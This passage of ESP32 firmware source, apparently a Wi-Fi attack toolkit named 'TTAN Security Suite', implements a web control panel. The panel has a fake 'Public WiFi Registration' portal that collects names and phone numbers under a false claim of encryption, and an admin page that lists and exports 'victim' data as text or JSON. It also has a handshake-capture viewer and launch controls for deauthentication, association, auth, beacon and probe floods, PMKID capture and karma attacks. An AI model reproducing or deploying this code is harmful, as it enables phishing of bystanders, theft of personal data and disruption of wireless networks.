    if (state.authFloodActive) stopAuthFlood();
    if (state.karmaActive) stopKarma();
    if (state.monitorActive) stopMonitor();
    Serial.println("All attacks stopped");
  }
}

namespace HTML {
  String getCaptivePortal() {
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    html += "<meta charset='UTF-8'>";
    html += "<title>Public WiFi Registration</title><style>";
    html += "body{margin:0;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;";
    html += "background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}";
    html += ".container{background:#fff;padding:40px;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,0.3);max-width:400px;width:100%}";
    html += "h2{margin:0 0 10px;color:#333;text-align:center;font-size:24px}";
    html += ".subtitle{text-align:center;color:#666;margin-bottom:30px;font-size:14px}";
    html += "input{width:100%;padding:14px;margin:12px 0;border:2px solid #e0e0e0;border-radius:8px;box-sizing:border-box;font-size:15px;transition:border 0.3s}";
    html += "input:focus{border-color:#667eea;outline:none}";
    html += "button{width:100%;padding:16px;background:#667eea;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.3s}";
    html += "button:hover{background:#5568d3}";
    html += ".info{margin-top:20px;text-align:center;color:#888;font-size:12px}";
    html += ".logo{text-align:center;margin-bottom:20px;font-size:48px}";
    html += "</style></head><body>";
    html += "<div class='container'>";
    html += "<div class='logo'>ðŸ“±</div>";
    html += "<h2>Public WiFi Registration</h2>";
    html += "<div class='subtitle'>Enter your details to access to network</div>";
    html += "<form method='POST' action='/submit'>";
    html += "<input name='name' placeholder='Full Name' required autocomplete='off' maxlength='32'>";
    html += "<input name='mobile' type='tel' placeholder='Mobile Number' required autocomplete='off' maxlength='15' pattern='[0-9]{10,15}'>";
    html += "<button type='submit'>Connect to Network</button>";
    html += "</form>";
    html += "<div class='info'>Your information is encrypted and secure</div>";
    html += "</div></body></html>";
    return html;
  }
  
  String getSuccessPage() {
    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><style>";
    html += "body{font-family:Arial;background:#667eea;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}";
    html += ".box{background:#fff;padding:50px;border-radius:12px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.2)}";
    html += "h2{color:#2ecc71;margin:0 0 15px;font-size:28px}";
    html += "p{color:#666;margin:0;font-size:16px}";
    html += ".check{font-size:60px;color:#2ecc71;margin-bottom:20px}";
    html += "</style></head><body><div class='box'>";
    html += "<div class='check'>âœ“</div>";
    html += "<h2>Registration Successful</h2>";
    html += "<p>Your device is now connected to network</p>";
    html += "</div></body></html>";
    return html;
  }
  
  String getHandshakePage() {
    String page = "<!DOCTYPE html><html><head>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<meta charset='UTF-8'>";
    page += "<title>Handshake Capture</title><style>";
    page += "body{font-family:'Courier New',monospace;background:#0a0e27;color:#0f0;padding:20px;margin:0}";
    page += ".wrap{max-width:1000px;margin:0 auto}";
    page += "h1{color:#0f0;text-shadow:0 0 10px #0f0;text-align:center;font-size:2em;border-bottom:2px solid #0f0;padding-bottom:10px}";
    page += ".info{background:#0f1419;padding:15px;border:2px solid #0f0;border-radius:8px;margin:20px 0;box-shadow:0 0 20px rgba(0,255,0,0.3)}";
    page += ".handshake{background:#0f1419;padding:15px;margin:10px 0;border-radius:8px;border-left:5px solid #0f0;box-shadow:0 0 15px rgba(0,255,0,0.2);word-wrap:break-word}";
    page += ".count{color:#ff0;font-size:1.3em;text-align:center;margin:20px 0;padding:15px;background:#1a1a00;border:2px solid #ff0;border-radius:8px}";
    page += ".empty{text-align:center;color:#ff0;padding:40px;font-size:1.1em}";
    page += ".btn-group{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin:20px 0}";
    page += ".btn{padding:15px;text-align:center;border:2px solid;border-radius:8px;text-decoration:none;display:block;font-weight:bold;transition:all 0.3s;cursor:pointer}";
    page += ".btn-export{background:#001a1a;color:#0ff;border-color:#0ff}";
    page += ".btn-export:hover{background:#0ff;color:#000}";
    page += ".btn-clear{background:#1a0000;color:#f00;border-color:#f00}";
    page += ".btn-clear:hover{background:#f00;color:#fff}";
    page += ".btn-back{background:#1a1a00;color:#ff0;border-color:#ff0}";
    page += ".btn-back:hover{background:#ff0;color:#000}";
    page += "textarea{width:100%;min-height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:'Courier New',monospace;font-size:0.9em;border-radius:5px}";
    page += ".export-section{margin:20px 0;display:none}";
    page += ".export-section.show{display:block}";
    page += "</style></head><body><div class='wrap'>";
    
    page += "<h1>HANDSHAKE CAPTURE</h1>";
    
    if (state.handshakeActive) {
      page += "<div class='info'>";
      page += "<b style='color:#0f0;font-size:1.2em'>CAPTURE ACTIVE</b><br>";
      page += "<div style='margin-top:10px;color:#0ff'>";
      page += "Channel: <b>" + String(state.targetChannel) + "</b><br>";
      page += "Packets: <b>" + String(state.packetCount) + "</b><br>";
      page += "EAPOL frames: <b>" + String(state.eapolCount) + "</b><br>";
      page += "Complete handshakes: <b>" + String(state.handshakeCount) + "</b><br>";
      page += "Runtime: <b>" + Utils::formatUptime(millis() - state.startTime) + "</b>";
      page += "</div></div>";
    } else {
      page += "<div class='info' style='border-color:#666;color:#666'>";
      page += "<b>CAPTURE INACTIVE</b>";
      page += "</div>";
    }
    
    page += "<div class='count'>Total Handshakes: " + String(state.handshakeCount) + "</div>";
    
    page += "<div class='btn-group'>";
    page += "<a href='#' class='btn btn-export' onclick='toggleExport();return false'>Export as Text</a>";
    page += "<a href='/handshake/clear' class='btn btn-clear' onclick='return confirm(\"Clear all captured handshakes?\")'>Clear All Data</a>";
    page += "<a href='http://" + WiFi.softAPIP().toString() + "' class='btn btn-back'>Back to Dashboard</a>";
    page += "</div>";
    
    page += "<div id='exportSection' class='export-section'>";
    page += "<h3 style='color:#0ff'>Handshake Export:</h3>";
    page += "<textarea id='exportText' readonly>";
    
    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
      if (state.handshakes[i].complete) {
        page += "Handshake #" + String(i + 1) + " from " + Utils::macToString(state.handshakes[i].bssid) + "\n";
        page += "Frame count: " + String(state.handshakes[i].frameCount) + "\n\n";
      }
    }
    
    page += "</textarea>";
    page += "<button class='btn btn-export' style='margin-top:10px' onclick='copyToClipboard()'>Copy to Clipboard</button>";
    page += "</div>";
    
    page += "<h2 style='color:#0f0;margin-top:30px;border-bottom:2px solid #0f0;padding-bottom:10px'>Captured Handshakes</h2>";
    
    if (state.handshakeCount > 0) {
      for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
        if (state.handshakes[i].complete) {
          page += "<div class='handshake'>";
          page += "<b style='color:#0f0'>Handshake #" + String(i + 1) + "</b><br>";
          page += "<span style='color:#0ff'>BSSID: " + Utils::macToString(state.handshakes[i].bssid) + "</span><br>";
          page += "<span style='color:#ff0'>Frame count: " + String(state.handshakes[i].frameCount) + "</span>";
          page += "</div>";
        }
      }
    } else {
      page += "<div class='empty'> No handshakes captured yet.</div>";
    }
    
    page += "</div>";
    page += "<script>";
    page += "function toggleExport(){var section=document.getElementById('exportSection');section.classList.toggle('show');}";
    page += "function copyToClipboard(){var text=document.getElementById('exportText');text.select();document.execCommand('copy');alert('Copied!');}";
    page += "</script>";
    page += "</body></html>";
    
    return page;
  }
}

namespace AdminHandlers {
  void handleAdminRoot() {
    String page = "<!DOCTYPE html><html><head>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<meta charset='UTF-8'>";
    page += "<title>Admin Panel</title><style>";
    page += "body{font-family:'Courier New',monospace;background:#1a0000;color:#f00;padding:20px;margin:0}";
    page += ".wrap{max-width:1000px;margin:0 auto}";
    page += "h1{color:#f00;text-shadow:0 0 15px #f00;text-align:center;font-size:2em;border-bottom:2px solid #f00;padding-bottom:10px}";
    page += ".info{background:#0f1419;padding:15px;border:2px solid #f00;border-radius:8px;margin:20px 0;box-shadow:0 0 20px rgba(255,0,0,0.3)}";
    page += ".cred{background:#0f1419;padding:15px;margin:10px 0;border-radius:8px;border-left:5px solid #f00;box-shadow:0 0 15px rgba(255,0,0,0.2);word-wrap:break-word}";
    page += ".count{color:#ff0;font-size:1.3em;text-align:center;margin:20px 0;padding:15px;background:#1a1a00;border:2px solid #ff0;border-radius:8px}";
    page += ".btn-group{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin:20px 0}";
    page += ".btn{padding:15px;text-align:center;border:2px solid;border-radius:8px;text-decoration:none;display:block;font-weight:bold;transition:all 0.3s;cursor:pointer}";
    page += ".btn-export{background:#001a1a;color:#0ff;border-color:#0ff}";
    page += ".btn-export:hover{background:#0ff;color:#000}";
    page += ".btn-clear{background:#1a0000;color:#f00;border-color:#f00}";
    page += ".btn-clear:hover{background:#f00;color:#fff}";
    page += ".btn-back{background:#1a1a00;color:#ff0;border-color:#ff0}";
    page += ".btn-back:hover{background:#ff0;color:#000}";
    page += "textarea{width:100%;min-height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:'Courier New',monospace;font-size:0.9em;border-radius:5px}";
    page += ".export-section{margin:20px 0;display:none}";
    page += ".export-section.show{display:block}";
    page += "</style></head><body><div class='wrap'>";
    
    page += "<h1>ADMIN PANEL</h1>";
    
    if (state.portalActive) {
      page += "<div class='info'>";
      page += "<b style='color:#f00;font-size:1.2em'>PORTAL ACTIVE</b><br>";
      page += "<div style='margin-top:10px;color:#0f0'>";
      page += "Fake SSID: <b>" + state.currentPortalSSID + "</b><br>";
      page += "Victims Connected: <b>" + String(WiFi.softAPgetStationNum()) + "</b>";
      page += "</div></div>";
    } else {
      page += "<div class='info' style='border-color:#666;color:#666'>";
      page += "<b>PORTAL INACTIVE</b>";
      page += "</div>";
    }
    
    page += "<div class='count'>Total Victims: " + String(state.credentialCount) + "</div>";
    
    page += "<div class='btn-group'>";
    page += "<a href='#' class='btn btn-export' onclick='toggleExport();return false'>Export as Text</a>";
    page += "<a href='/admin/json' class='btn btn-export' target='_blank'>Export as JSON</a>";
    page += "<a href='/admin/clear' class='btn btn-clear' onclick='return confirm(\"Clear all captured victim data?\")'>Clear All Data</a>";
    page += "<a href='http://" + WiFi.softAPIP().toString() + "' class='btn btn-back'>Back to Dashboard</a>";
    page += "</div>";
    
    page += "<div id='exportSection' class='export-section'>";
    page += "<h3 style='color:#0ff'>Victim Data Export:</h3>";
    page += "<textarea id='exportText' readonly>";
    for (int i = 0; i < state.credentialCount; i++) {
      page += state.credentials[i] + "\n";
    }
    page += "</textarea>";
    page += "<button class='btn btn-export' style='margin-top:10px' onclick='copyToClipboard()'>Copy to Clipboard</button>";
    page += "</div>";
    
    page += "<h2 style='color:#f00;margin-top:30px;border-bottom:2px solid #f00;padding-bottom:10px'>Captured Victim Information</h2>";
    
    if (state.credentialCount > 0) {
      for (int i = state.credentialCount - 1; i >= 0; i--) {  
        page += "<div class='cred'>";
        page += "<b style='color:#f00'>#" + String(state.credentialCount - i) + "</b><br>";
        page += "<span style='color:#0f0'>" + state.credentials[i] + "</span>";
        page += "</div>";
      }
    } else {
      page += "<div class='empty'> No victim information captured yet.</div>";
    }
    
    page += "</div>";
    page += "<script>";
    page += "function toggleExport(){var section=document.getElementById('exportSection');section.classList.toggle('show');}";
    page += "function copyToClipboard(){var text=document.getElementById('exportText');text.select();document.execCommand('copy');alert('Copied!');}";
    page += "</script>";
    page += "</body></html>";
    
    state.adminServer->send(200, "text/html", page);
  }
  
  void handleAdminJSON() {
    String json = "{\"victims\":[";
    for (int i = 0; i < state.credentialCount; i++) {
      if (i > 0) json += ",";
      json += "{\"id\":" + String(i + 1) + ",\"data\":\"" + state.credentials[i] + "\"}";
    }
    json += "],\"total\":" + String(state.credentialCount) + "}";
    state.adminServer->send(200, "application/json", json);
  }
  
  void handleAdminClear() {
    state.credentialCount = 0;
    for (int i = 0; i < Config::MAX_CREDENTIALS; i++) state.credentials[i] = "";
    state.adminServer->sendHeader("Location", "/admin");
    state.adminServer->send(302);
  }
  
  void handleAdminNotFound() {
    state.adminServer->sendHeader("Location", "/admin");
    state.adminServer->send(302);
  }
}

namespace Handlers {
  void handleRoot() {
    if (state.portalActive) {
      state.server->send(200, "text/html", HTML::getCaptivePortal());
      return;
    }
    
    state.totalRequests++;
    
    String page = "<!DOCTYPE html><html><head>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<meta http-equiv='refresh' content='5'>";
    page += "<meta charset='UTF-8'>";
    page += "<title>TTAN Security Suite</title><style>";
    page += "body{margin:0;padding:10px;font-family:'Courier New',monospace;background:#0a0e27;color:#0f0}";
    page += ".wrap{max-width:1200px;margin:0 auto}";
    page += "h1{text-align:center;color:#0f0;font-size:1.8em;margin:15px 0;text-shadow:0 0 10px #0f0}";
    page += ".box{background:#0f1419;border:2px solid #0f0;border-radius:8px;padding:15px;margin:10px 0;box-shadow:0 0 15px rgba(0,255,0,0.2)}";
    page += ".active{border-color:#f00;background:#1a0000;box-shadow:0 0 15px rgba(255,0,0,0.3)}";
    page += ".warn{background:#ff0;color:#000;padding:10px;text-align:center;font-weight:bold;margin:10px 0;border-radius:5px;animation:pulse 1s infinite}";
    page += "@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.7}}";
    page += ".grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:8px;margin:12px 0}";
    page += ".btn{padding:12px;text-align:center;border:2px solid;border-radius:6px;text-decoration:none;display:block;font-size:0.9em;font-weight:bold;transition:all 0.3s}";
    page += ".b1{background:#001a1a;color:#0ff;border-color:#0ff}.b1:hover{background:#0ff;color:#000}";
    page += ".b2{background:#1a1a00;color:#ff0;border-color:#ff0}.b2:hover{background:#ff0;color:#000}";
    page += ".b3{background:#1a0000;color:#f00;border-color:#f00}.b3:hover{background:#f00;color:#fff}";
    page += "table{width:100%;border-collapse:collapse;font-size:0.85em;margin:10px 0}";
    page += "th,td{border:1px solid #0f0;padding:8px;text-align:left}";
    page += "th{background:#001a00;font-weight:bold}";
    page += ".mini{padding:4px 8px;background:#0a5;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:0.75em}";
    page += ".mini:hover{background:#0c7}";
    page += ".stat{display:inline-block;margin:5px 10px;padding:8px 15px;background:#001a00;border-radius:5px;border:1px solid #0f0;color:#0f0}";
    page += ".badge{background:#f00;color:#fff;padding:2px 6px;border-radius:10px;font-size:0.8em;margin-left:5px}";
    page += ".error{color:#f00;font-size:0.9em;margin-top:10px}";
    page += ".monitor-bar{height:20px;background:#333;border-radius:10px;overflow:hidden;margin:5px 0}";
    page += ".monitor-fill{height:100%;background:linear-gradient(90deg,#0f0,#ff0,#f00);transition:width 0.5s}";
    page += "</style></head><body><div class='wrap'>";
    
    page += "<h1>TTAN SECURITY SUITE v2.4</h1>";
    
    if (state.deauthActive || state.disassocActive || state.assocFloodActive || state.pmkidActive || state.portalActive || state.snifferActive || 
        state.handshakeActive || state.beaconFloodActive || state.probeFloodActive || state.authFloodActive || state.karmaActive || state.monitorActive) {
      page += "<div class='warn'>OPERATION IN PROGRESS</div>";
    }
    
    page += "<div class='box'><b>SYSTEM STATUS</b><br>";
    page += "<div class='stat'>Clients: " + String(WiFi.softAPgetStationNum()) + "</div>";
    page += "<div class='stat'>Uptime: " + Utils::formatUptime(millis() - state.startTime) + "</div>";
    page += "<div class='stat'>Free RAM: " + String(ESP.getFreeHeap() / 1024) + " KB</div>";
    page += "<div class='stat'>Requests: " + String(state.totalRequests) + "</div>";
    if (state.errorCount > 0) page += "<div class='error'>Last error: " + state.lastError + "</div>";
    page += "</div>";
    
    page += "<div class='box'><b>RECONNAISSANCE</b><div class='grid'>";
    page += "<a href='/s' class='btn b1'>WiFi Scan</a>";
    page += "<a href='/h' class='btn b1'>Host Scan</a>";
    page += "<a href='/x' class='btn b1'>Clear Logs</a>";
    page += "<a href='/stop' class='btn b3'>Stop All</a>";
    page += "<a href='/r' class='btn b3'>Reboot</a>";
    page += "</div></div>";
    
    String boxClass = (state.deauthActive || state.disassocActive || state.assocFloodActive || state.pmkidActive || state.portalActive || state.snifferActive ||
                      state.handshakeActive || state.beaconFloodActive || state.probeFloodActive || 
                      state.authFloodActive || state.karmaActive || state.monitorActive) ? "box active" : "box";
    page += "<div class='" + boxClass + "'>";
    page += "<b>ATTACKS & TOOLS</b><br>";
    page += "Channel: <select id='ch' style='background:#000;color:#0f0;border:1px solid #0f0;padding:5px'>";
    for (int i = 1; i <= 13; i++) {
      String selected = (i == state.targetChannel) ? " selected" : "";
      page += "<option" + selected + ">" + String(i) + "</option>";
    }
    page += "</select><div class='grid' style='margin-top:10px'>";
    
    if (state.monitorActive) {
       page += "<a href='/ms' class='btn b3'>STOP Monitor</a>";
    } else {
       page += "<a href='#' class='btn b1' onclick='startMonitor()'>Channel Analysis</a>";
       page += "<a href='#' class='btn b1' onclick='startHopper()'>Channel Hopper</a>";
    }
    
    if (state.deauthActive) {
      page += "<a href='/ds' class='btn b3'>STOP Deauth</a>";
    } else {
      page += "<span class='btn b2' style='opacity:0.6;cursor:not-allowed'>Deauth (Scan)</span>";
    }   // cool this is a easter egg you get respect for reading this code

    if (state.disassocActive) {
      page += "<a href='/dss' class='btn b3'>STOP Disassoc</a>";
    } else {
      page += "<span class='btn b2' style='opacity:0.6;cursor:not-allowed'>Disassoc (Scan)</span>";
    }

    if (state.assocFloodActive) {
      page += "<a href='/ass' class='btn b3'>STOP Assoc</a>";
    } else {
      page += "<span class='btn b2' style='opacity:0.6;cursor:not-allowed'>Assoc Flood (Scan)</span>";
    }
    
    if (state.pmkidActive) {
      page += "<a href='/ps' class='btn b3'>STOP PMKID</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startPMKID()'>PMKID Capture</a>";
    }
    
    if (state.handshakeActive) {
      page += "<a href='/hs' class='btn b3'>STOP Handshake</a>";
      page += "<a href='/handshake' class='btn b1' target='_blank'>View Handshakes";
      if (state.handshakeCount > 0) page += "<span class='badge'>" + String(state.handshakeCount) + "</span>";
      page += "</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startHandshake()'>Handshake Capture</a>";
    }
    
    if (state.portalActive) {
      page += "<a href='/es' class='btn b3'>STOP Portal</a>";
      page += "<a href='http://" + WiFi.softAPIP().toString() + ":" + String(Config::ADMIN_PORT) + "/admin' class='btn b2' target='_blank'>View Victims";
      if (state.credentialCount > 0) page += "<span class='badge'>" + String(state.credentialCount) + "</span>";
      page += "</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startPortal()'>Evil Portal</a>";
    }
    
    if (state.snifferActive) {
      page += "<a href='/ns' class='btn b3'>STOP Sniffer</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startSniffer()'>Packet Sniffer</a>";
    }
    
    if (state.beaconFloodActive) {
      page += "<a href='/bs' class='btn b3'>STOP Beacon</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startBeacon()'>Beacon Flood</a>";
    }
    
    if (state.probeFloodActive) {
      page += "<a href='/prs' class='btn b3'>STOP Probe</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startProbe()'>Probe Flood</a>";
    }
    
    if (state.authFloodActive) {
      page += "<a href='/aus' class='btn b3'>STOP Auth</a>";
    } else {
      page += "<span class='btn b2' style='opacity:0.6;cursor:not-allowed'>Auth Flood (Scan)</span>";
    }
    
    if (state.karmaActive) {
      page += "<a href='/ks' class='btn b3'>STOP Karma</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startKarma()'>Karma Attack</a>";
    }
    
    page += "</div></div>";
    
    if (state.monitorActive) {
       page += "<div class='box active'><b>CHANNEL ANALYSIS</b><br>";
       page += "Channel: " + String(state.hopperActive ? "Hopping" : String(state.targetChannel)) + " | Rate: " + String(state.packetsPerSecond) + " pps<br>";
       page += "Mgmt: " + String(state.mgmtCount) + " | Data: " + String(state.dataCount) + " | Ctrl: " + String(state.ctrlCount) + "<br>";
       page += "<table style='margin-top:10px'><tr><th>Type</th><th>Src</th><th>Dst</th><th>RSSI</th></tr>";
       for(int i=0; i<Config::MONITOR_LOG_SIZE; i++) {
          int idx = (state.logIndex - 1 - i + Config::MONITOR_LOG_SIZE) % Config::MONITOR_LOG_SIZE;
          if (state.packetLogs[idx].time > 0) {
             page += "<tr><td>" + Utils::getFrameTypeStr(state.packetLogs[idx].type, state.packetLogs[idx].subtype) + "</td>";
             page += "<td>" + Utils::macToString(state.packetLogs[idx].src) + "</td>";
             page += "<td>" + Utils::macToString(state.packetLogs[idx].dst) + "</td>";
             page += "<td>" + String(state.packetLogs[idx].rssi) + "</td></tr>";
          }
       }
       page += "</table></div>";
    }
    
    if (state.deauthActive) page += "<div class='box active'><b>DEAUTH STATUS</b><br>" + state.deauthData + "</div>";
    if (state.disassocActive) page += "<div class='box active'><b>DISASSOC STATUS</b><br>" + state.disassocData + "</div>";
    if (state.assocFloodActive) page += "<div class='box active'><b>ASSOC FLOOD STATUS</b><br>" + state.assocData + "</div>";
    if (state.pmkidActive) page += "<div class='box active'><b>PMKID STATUS</b><br>" + state.pmkidData + "</div>";
    if (state.handshakeActive) page += "<div class='box active'><b>HANDSHAKE STATUS</b><br>" + state.handshakeData + "</div>";
    if (state.portalActive) page += "<div class='box active'><b>PORTAL STATUS</b><br>" + state.credentialData + "</div>";
    if (state.snifferActive) page += "<div class='box active'><b>SNIFFER STATUS</b><br>Packets: " + String(state.packetCount) + "</div>";
    if (state.beaconFloodActive) page += "<div class='box active'><b>BEACON STATUS</b><br>" + state.beaconData + "</div>";
    if (state.probeFloodActive) page += "<div class='box active'><b>PROBE STATUS</b><br>" + state.probeData + "</div>";
    if (state.authFloodActive) page += "<div class='box active'><b>AUTH STATUS</b><br>" + state.authData + "</div>";
    if (state.karmaActive) page += "<div class='box active'><b>KARMA STATUS</b><br>" + state.karmaData + "</div>";
    
    if (state.scanData.length() > 0 && !state.scanData.startsWith("Click")) {
      page += "<div class='box'><b>SCAN RESULTS</b><br>" + state.scanData + "</div>";
    }
    
    if (state.hostData.length() > 0 && !state.hostData.startsWith("Click")) {
      page += "<div class='box'><b>HOST SCAN</b><br>" + state.hostData + "</div>";
    }
    
    page += "</div>";
    page += "<script>";
    page += "function startMonitor(){var c=document.getElementById('ch').value;window.location='/m?c='+c}";
    page += "function startHopper(){window.location='/m?c=1&hop=1'}";
    page += "function startPMKID(){var c=document.getElementById('ch').value;window.location='/p?c='+c}";
    page += "function startHandshake(){var c=document.getElementById('ch').value;window.location='/hsh?c='+c}";
    page += "function startPortal(){var s=prompt('Enter fake SSID:','Free_WiFi');if(s)window.location='/e?s='+encodeURIComponent(s)}";
    page += "function startSniffer(){var c=document.getElementById('ch').value;window.location='/n?c='+c}";
    page += "function startBeacon(){var s=prompt('SSID:','FakeAP');if(s){var c=document.getElementById('ch').value;window.location='/b?s='+encodeURIComponent(s)+'&c='+c}}";
    page += "function startProbe(){var s=prompt('SSID:','TargetNetwork');if(s){var c=document.getElementById('ch').value;window.location='/pr?s='+encodeURIComponent(s)+'&c='+c}}";
    page += "function startKarma(){var s=prompt('SSID:','Free_WiFi');if(s)window.location='/k?s='+encodeURIComponent(s)}";
    page += "</script>";
    page += "</body></html>";
    
    state.server->send(200, "text/html", page);
  }
  
  void handleScan() {
    // 1. Send a visual cue to the user immediately
    // This prevents the browser from timing out while we kill the AP connection
    String msg = "<!DOCTYPE html><html><head><meta charset='UTF-8'>";
    msg += "<style>body{background:#0a0e27;color:#0f0;font-family:'Courier New',monospace;text-align:center;padding-top:50px;}";
    msg += "h1{font-size:24px;}p{font-size:16px;}</style></head><body>";
    msg += "<h1>SCANNING NETWORKS...</h1>";
    msg += "<p>AP is disconnecting to scan. Please wait.</p>";
    msg += "<p>Do not switch WiFi networks on your device.</p>";
    msg += "<p>Page will reload automatically in 10 seconds.</p>";
    msg += "<script>setTimeout(function(){ window.location='/'; }, 10000);</script>"; // Redirect back to root after 10s
    msg += "</body></html>";

    state.server->send(200, "text/html", msg);
    
    // 2. Small delay to ensure data packet is sent before nuking the interface
    delay(300); 

    // 3. Execute the actual scan (this breaks the connection temporarily)
    // Save current AP state
    String runningSSID = state.portalActive ? state.currentPortalSSID : String(Config::AP_SSID);
    String runningPass = state.portalActive ? "" : String(Config::AP_PASSWORD);
    bool dnsWasActive = state.dnsActive;

    // Clean up previous scan data to avoid memory fragmentation
    WiFi.scanDelete();
    
    // Stop services and disconnect
    if (dnsWasActive) state.dnsServer->stop();
    WiFi.softAPdisconnect(true);
    delay(100);

    // Switch to Station Mode for scanning
    WiFi.mode(WIFI_STA);
    delay(100);

    // Initialize Scan Result String
    state.scanData = "<table><tr><th>SSID</th><th>Signal</th><th>CH</th><th>BSSID</th><th>Action</th></tr>";
    
    // Perform Blocking Scan
    Serial.println("Starting WiFi Scan...");
    int n = WiFi.scanNetworks();
    Serial.println("Scan complete. Found: " + String(n) + " networks.");
    
    if (n > 0) {
      for (int i = 0; i < n && i < Config::MAX_SCAN_RESULTS; i++) {
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) ssid = "[Hidden]";
        ssid = Utils::sanitizeString(ssid);
        
        String bssid = WiFi.BSSIDstr(i);
        int channel = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        
        state.scanData += "<tr><td>" + ssid + "</td>";
        state.scanData += "<td>" + String(rssi) + " dBm</td>";
        state.scanData += "<td>" + String(channel) + "</td>";
        state.scanData += "<td style='font-size:0.75em'>" + bssid + "</td>";
        state.scanData += "<td><button class='mini' onclick='atk(\"" + bssid + "\"," + String(channel) + ",\"" + ssid + "\")'>DEAUTH</button>";
        state.scanData += "<button class='mini' onclick='atk2(\"" + bssid + "\"," + String(channel) + ")'>DISASSOC</button>";
        state.scanData += "<button class='mini' onclick='atk3(\"" + bssid + "\"," + String(channel) + ",\"" + ssid + "\")'>ASSOC</button>";
        state.scanData += "<button class='mini' onclick='atk4(\"" + bssid + "\"," + String(channel) + ")'>AUTH</button></td></tr>";
        
        Utils::resetWatchdog();
      }
      state.scanData += "</table><div style='margin-top:10px;color:#0ff'>Found " + String(n) + " network(s)</div>";
    } else {
      state.scanData += "<tr><td colspan='6' style='text-align:center'>No networks found</td></tr></table>";
    }
    
    // Clear scan results from memory
    WiFi.scanDelete();
    
    // Restore Access Point Mode
    WiFi.mode(WIFI_AP);
    delay(100);
    WiFi.softAP(runningSSID.c_str(), runningPass.c_str());
    
    // Wait for AP to stabilize
    delay(1000); 

    // Restart DNS if it was active
    if (dnsWasActive) {
      state.dnsServer->start(Config::DNS_PORT, "*", WiFi.softAPIP());
    }
    
    // We do NOT send a redirect here. The JS on the "Scanning" page handles it.
  }
  
  void handleHosts() {
    state.hostData = "<table><tr><th>MAC Address</th><th>Status</th></tr>";
    
    wifi_sta_list_t wifiStaList;
    memset(&wifiStaList, 0, sizeof(wifiStaList)); // Initialize structure
    
    esp_err_t err = esp_wifi_ap_get_sta_list(&wifiStaList);
    
    if (err == ESP_OK && wifiStaList.num > 0) {
      for (int i = 0; i < wifiStaList.num; i++) {
        state.hostData += "<tr><td>" + Utils::macToString(wifiStaList.sta[i].mac) + "</td>";
        state.hostData += "<td style='color:#0f0'>CONNECTED</td></tr>";
      }
      state.hostData += "</table><div style='margin-top:10px;color:#0ff'>Detected " + String(wifiStaList.num) + " client(s)</div>";
    } else {
      state.hostData += "<tr><td colspan='2' style='text-align:center'>No connected clients</td></tr></table>";
    }
    
    Serial.println("Host scan complete - Found " + String(wifiStaList.num) + " hosts");
    
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleMonitorStart() {
    int channel = state.server->arg("c").toInt();
    bool hop = (state.server->arg("hop") == "1");
    if (channel == 0) channel = 1;
    Attacks::startMonitor(channel, hop);
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }

  void handleMonitorStop() {
    Attacks::stopMonitor();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleDeauthStart() {
    String mac = state.server->arg("m");
    String ssid = state.server->arg("s");
    int channel = state.server->arg("c").toInt();
    if (mac.length() == 0) { state.server->send(400); return; }
    if (Attacks::startDeauth(mac, channel, ssid)) { state.server->sendHeader("Location", "/"); state.server->send(302); }
    else state.server->send(400);
  }
  
  void handleDisassocStart() {
    String mac = state.server->arg("m");
    String ssid = state.server->arg("s");
    int channel = state.server->arg("c").toInt();
    if (mac.length() == 0) { state.server->send(400); return; }
    if (Attacks::startDisassoc(mac, channel, ssid)) { state.server->sendHeader("Location", "/"); state.server->send(302); }
    else state.server->send(400);
  }

  void handleAssocStart() {
    String mac = state.server->arg("m");
    String ssid = state.server->arg("s");
    int channel = state.server->arg("c").toInt();
    if (mac.length() == 0) { state.server->send(400); return; }
    if (Attacks::startAssocFlood(mac, channel, ssid)) { state.server->sendHeader("Location", "/"); state.server->send(302); }
    else state.server->send(400);
  }
  
  void handleDeauthStop() { Attacks::stopDeauth(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  void handleDisassocStop() { Attacks::stopDisassoc(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  void handleAssocStop() { Attacks::stopAssocFlood(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  
  void handlePMKIDStart() { Attacks::startPMKID(state.server->arg("c").toInt()); state.server->sendHeader("Location", "/"); state.server->send(302); }
  void handlePMKIDStop() { Attacks::stopPMKID(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  void handleHandshakeStart() { Attacks::startHandshake(state.server->arg("c").toInt()); state.server->sendHeader("Location", "/"); state.server->send(302); }
